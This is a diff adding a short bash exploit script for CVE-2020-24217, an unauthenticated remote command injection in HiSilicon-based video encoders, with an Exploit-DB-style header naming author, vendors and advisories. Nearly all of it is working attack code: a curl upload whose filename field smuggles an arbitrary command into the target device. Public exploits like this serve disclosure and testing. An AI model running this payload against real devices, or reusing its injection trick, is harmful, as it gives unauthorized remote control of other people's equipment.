@@ -1,0 +1,28 @@
+#!/usr/bin/env bash
+
+# Exploit Title: HiSilicon video encoders - RCE via unauthenticated command injection
+# Date: 2020-09-20
+# Exploit Author: Alexei Kojenov
+# Vendor Homepage: multiple vendors
+# Software Link: N/A
+# Version: vendor-specific
+# Tested on: Linux
+# CVE: CVE-2020-24217
+# Vendors: URayTech, J-Tech Digital, ProVideoInstruments
+# Reference: https://kojenov.com/2020-09-15-hisilicon-encoder-vulnerabilities/
+# Reference: https://www.kb.cert.org/vuls/id/896979
+
+
+if [ "$#" -ne 2 ]
+then
+  echo "Usage: $0 <server>[:<port>] <command>"
+  exit 1
+fi
+
+printf "executing the command... "
+if curl -sF "upgrade=;filename=\"logo;$2;.png\"" http://$1 >/dev/null
+then
+  echo "SUCCESS: remote command executed"
+else
+  echo "ERROR: $?"
+fi
